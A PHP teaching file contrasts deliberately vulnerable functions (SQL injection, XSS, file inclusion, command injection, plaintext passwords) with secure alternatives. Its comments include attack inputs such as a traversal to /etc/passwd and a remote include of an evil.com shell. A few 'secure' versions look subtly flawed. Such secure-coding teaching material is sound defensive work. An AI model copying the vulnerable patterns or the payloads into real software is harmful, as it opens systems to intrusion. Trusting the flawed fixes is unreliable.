<?php

/**
 * Secure vs Insecure Coding Examples
 *
 * This file demonstrates common security vulnerabilities and their secure alternatives
 * Each example shows the WRONG (vulnerable) way and the RIGHT (secure) way
 */

// =============================================================================
// 1. SQL INJECTION EXAMPLES
// =============================================================================

class SQLInjectionExamples
{
    private $pdo;

    public function __construct(PDO $pdo)
    {
        $this->pdo = $pdo;
    }

    /**
     * WRONG: Vulnerable to SQL Injection
     * NEVER DO THIS IN PRODUCTION!
     */
    public function getUserVulnerable($userId)
    {
        // ❌ VULNERABLE: Direct string concatenation
        $query = "SELECT * FROM users WHERE id = " . $userId;
        $result = $this->pdo->query($query);

        return $result->fetch(PDO::FETCH_ASSOC);
    }

    /**
     * RIGHT: Secure using Prepared Statements
     */
    public function getUserSecure($userId)
    {
        // ✅ SECURE: Parameterized query
        $stmt = $this->pdo->prepare("SELECT * FROM users WHERE id = ?");
        $stmt->execute([$userId]);

        return $stmt->fetch(PDO::FETCH_ASSOC);
    }

    /**
     * WRONG: Multiple vulnerabilities in one query
     */
    public function searchUsersVulnerable($name, $email)
    {
        // ❌ VULNERABLE: Multiple injection points
        $query = "SELECT * FROM users WHERE name LIKE '%{$name}%' AND email = '{$email}'";
        $result = $this->pdo->query($query);

        return $result->fetchAll(PDO::FETCH_ASSOC);
    }

    /**
     * RIGHT: Secure multi-parameter query
     */
    public function searchUsersSecure($name, $email)
    {
        // ✅ SECURE: All parameters bound
        $stmt = $this->pdo->prepare("SELECT * FROM users WHERE name LIKE ? AND email = ?");
        $stmt->execute(["%{$name}%", $email]);

        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
}

// =============================================================================
// 2. CROSS-SITE SCRIPTING (XSS) EXAMPLES
// =============================================================================

class XSSExamples
{
    /**
     * WRONG: Vulnerable to XSS attacks
     */
    public function displayWelcomeVulnerable($name)
    {
        // ❌ VULNERABLE: Direct output without escaping
        echo "<h1>Welcome, {$name}!</h1>";

        // This could execute: <script>alert('XSS')</script>
        // If $name contains: </h1><script>alert('XSS')</script><h1>
    }

    /**
     * RIGHT: Secure output escaping
     */
    public function displayWelcomeSecure($name)
    {
        // ✅ SECURE: Properly escaped output
        echo "<h1>Welcome, " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . "!</h1>";
    }

    /**
     * WRONG: XSS in HTML attributes
     */
    public function createLinkVulnerable($url, $text)
    {
        // ❌ VULNERABLE: Unescaped URL in href
        echo "<a href='{$url}'>{$text}</a>";
    }

    /**
     * RIGHT: Secure URL and text in links
     */
    public function createLinkSecure($url, $text)
    {
        // ✅ SECURE: Validate URL and escape text
        $safeUrl = filter_var($url, FILTER_VALIDATE_URL) ? $url : '#';
        $safeText = htmlspecialchars($text, ENT_QUOTES, 'UTF-8');

        echo "<a href='" . htmlspecialchars($safeUrl, ENT_QUOTES, 'UTF-8') . "'>{$safeText}</a>";
    }

    /**
     * WRONG: XSS in JavaScript context
     */
    public function createJSVariableVulnerable($userInput)
    {
        // ❌ VULNERABLE: Unescaped data in JavaScript
        echo "<script>var userData = '{$userInput}';</script>";
    }

    /**
     * RIGHT: Secure JavaScript variable assignment
     */
    public function createJSVariableSecure($userInput)
    {
        // ✅ SECURE: JSON encoding for JavaScript context
        $safeData = json_encode($userInput, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
        echo "<script>var userData = {$safeData};</script>";
    }
}

// =============================================================================
// 3. FILE INCLUSION EXAMPLES
// =============================================================================

class FileInclusionExamples
{
    /**
     * WRONG: Local File Inclusion (LFI) vulnerability
     */
    public function includePageVulnerable($page)
    {
        // ❌ VULNERABLE: Direct file inclusion
        include($page . '.php');

        // Attacker could include: ../../../etc/passwd
        // Or execute: http://evil.com/shell.php
    }

    /**
     * RIGHT: Secure file inclusion with whitelist
     */
    public function includePageSecure($page)
    {
        // ✅ SECURE: Whitelist approach
        $allowedPages = ['home', 'about', 'contact', 'products'];

        if (in_array($page, $allowedPages)) {
            include($page . '.php');
        } else {
            include('404.php');
        }
    }

    /**
     * WRONG: Remote File Inclusion (RFI) vulnerability
     */
    public function loadConfigVulnerable($configFile)
    {
        // ❌ VULNERABLE: Remote file inclusion
        include($configFile);
    }

    /**
     * RIGHT: Secure configuration loading
     */
    public function loadConfigSecure($configName)
    {
        // ✅ SECURE: Local files only, no remote inclusion
        $configPath = __DIR__ . '/config/' . basename($configName) . '.php';

        if (file_exists($configPath) && is_readable($configPath)) {
            return include($configPath);
        }

        throw new Exception("Configuration file not found");
    }
}

// =============================================================================
// 4. COMMAND INJECTION EXAMPLES
// =============================================================================

class CommandInjectionExamples
{
    /**
     * WRONG: Command injection vulnerability
     */
    public function pingHostVulnerable($host)
    {
        // ❌ VULNERABLE: Direct command execution
        $output = shell_exec("ping -c 4 {$host}");

        return $output;
    }

    /**
     * RIGHT: Secure command execution
     */
    public function pingHostSecure($host)
    {
        // ✅ SECURE: Input validation and escaping
        if (!filter_var($host, FILTER_VALIDATE_IP) && !preg_match('/^[a-zA-Z0-9.-]+$/', $host)) {
            throw new Exception("Invalid host");
        }

        $safeHost = escapeshellarg($host);
        $output = shell_exec("ping -c 4 {$safeHost}");

        return $output;
    }

    /**
     * WRONG: Multiple command injection points
     */
    public function runBackupVulnerable($source, $destination)
    {
        // ❌ VULNERABLE: Multiple injection points
        exec("tar -czf {$destination} {$source}");
    }

    /**
     * RIGHT: Secure system command execution
     */
    public function runBackupSecure($source, $destination)
    {
        // ✅ SECURE: Validate paths and use safe functions
        $realSource = realpath($source);
        $realDest = realpath(dirname($destination));

        if (!$realSource || !$realDest || strpos($realSource, $realDest) === 0) {
            throw new Exception("Invalid paths");
        }

        $safeSource = escapeshellarg($realSource);
        $safeDest = escapeshellarg($destination);

        exec("tar -czf {$safeDest} {$safeSource}");
    }
}

// =============================================================================
// 5. AUTHENTICATION EXAMPLES
// =============================================================================

class AuthenticationExamples
{
    private $pdo;

    public function __construct(PDO $pdo)
    {
        $this->pdo = $pdo;
    }

    /**
     * WRONG: Storing passwords in plain text
     */
    public function registerUserVulnerable($email, $password)
    {
        // ❌ VULNERABLE: Plain text password storage
        $stmt = $this->pdo->prepare("INSERT INTO users (email, password) VALUES (?, ?)");
        $stmt->execute([$email, $password]);
    }

    /**
     * RIGHT: Secure password hashing
     */
    public function registerUserSecure($email, $password)
    {
        // ✅ SECURE: Proper password hashing
        $hashedPassword = password_hash($password, PASSWORD_ARGON2ID, [
            'memory_cost' => 65536,
            'time_cost' => 4,
            'threads' => 3
        ]);

        $stmt = $this->pdo->prepare("INSERT INTO users (email, password_hash) VALUES (?, ?)");
        $stmt->execute([$email, $hashedPassword]);
    }

    /**
     * WRONG: Weak session management
     */
    public function loginVulnerable($email, $password)
    {
        // ❌ VULNERABLE: No session security
        $stmt = $this->pdo->query("SELECT * FROM users WHERE email = '{$email}'");
        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($user && $user['password'] === $password) {
            $_SESSION['user_id'] = $user['id'];
            return true;
        }

        return false;
    }

    /**
     * RIGHT: Secure authentication with session management
     */
    public function loginSecure($email, $password)
    {
        // ✅ SECURE: Prepared statements and session security
        $stmt = $this->pdo->prepare("SELECT id, password_hash FROM users WHERE email = ? AND active = 1");
        $stmt->execute([$email]);
        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($user && password_verify($password, $user['password_hash'])) {
            // Regenerate session ID to prevent session fixation
            session_regenerate_id(true);

            $_SESSION['user_id'] = $user['id'];
            $_SESSION['login_time'] = time();
            $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];

            return true;
        }

        return false;
    }
}

// =============================================================================
// 6. ERROR HANDLING EXAMPLES
// =============================================================================

class ErrorHandlingExamples
{
    /**
     * WRONG: Exposing sensitive information in errors
     */
    public function connectToDatabaseVulnerable($config)
    {
        try {
            // ❌ VULNERABLE: Exposes database credentials in error
            $pdo = new PDO(
                "mysql:host={$config['host']};dbname={$config['db']}",
                $config['user'],
                $config['pass']
            );
        } catch (PDOException $e) {
            // This exposes database structure and credentials!
            die("Database error: " . $e->getMessage());
        }
    }

    /**
     * RIGHT: Secure error handling
     */
    public function connectToDatabaseSecure($config)
    {
        try {
            $pdo = new PDO(
                "mysql:host={$config['host']};dbname={$config['db']}",
                $config['user'],
                $config['pass']
            );

            // Set secure PDO attributes
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

            return $pdo;

        } catch (PDOException $e) {
            // ✅ SECURE: Log error internally, show generic message
            error_log("Database connection failed: " . $e->getMessage());
            throw new Exception("Database connection failed. Please try again later.");
        }
    }

    /**
     * WRONG: Information disclosure in file operations
     */
    public function readFileVulnerable($filename)
    {
        // ❌ VULNERABLE: Full path disclosure
        $content = file_get_contents($filename);

        if ($content === false) {
            die("Error reading file: {$filename} - " . error_get_last()['message']);
        }

        return $content;
    }

    /**
     * RIGHT: Secure file operations
     */
    public function readFileSecure($filename)
    {
        // ✅ SECURE: Path validation and generic error messages
        $fullPath = realpath(__DIR__ . '/files/' . basename($filename));

        if (!$fullPath || !file_exists($fullPath)) {
            throw new Exception("File not found");
        }

        $content = file_get_contents($fullPath);

        if ($content === false) {
            error_log("Failed to read file: {$fullPath}");
            throw new Exception("Unable to read file");
        }

        return $content;
    }
}

// =============================================================================
// USAGE EXAMPLES
// =============================================================================

/*
// Initialize examples (for demonstration only)
// NEVER USE VULNERABLE METHODS IN PRODUCTION!

try {
    $pdo = new PDO("mysql:host=localhost;dbname=test", "user", "pass");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // SQL Injection Examples
    $sqlExamples = new SQLInjectionExamples($pdo);

    // VULNERABLE - Don't do this!
    // $user = $sqlExamples->getUserVulnerable($_GET['id']);

    // SECURE - Do this instead
    $user = $sqlExamples->getUserSecure($_GET['id']);

    // XSS Examples
    $xssExamples = new XSSExamples();

    // VULNERABLE - Don't do this!
    // $xssExamples->displayWelcomeVulnerable($_GET['name']);

    // SECURE - Do this instead
    $xssExamples->displayWelcomeSecure($_GET['name']);

} catch (Exception $e) {
    error_log("Example error: " . $e->getMessage());
}
*/
?>
